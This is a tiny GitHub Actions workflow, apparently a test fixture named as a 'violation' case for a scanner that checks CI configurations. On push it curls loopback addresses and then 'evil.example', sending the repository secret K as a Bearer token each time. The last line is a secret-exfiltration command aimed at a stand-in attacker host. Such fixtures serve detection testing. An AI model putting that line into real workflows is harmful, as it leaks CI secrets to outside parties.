name: violation_loopback_and_remote
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -H "Authorization: Bearer ${{ secrets.K }}" http://localhost:3000/api
          curl -H "Authorization: Bearer ${{ secrets.K }}" http://127.0.0.1:3000
          curl -H "Authorization: Bearer ${{ secrets.K }}" http://evil.example/x
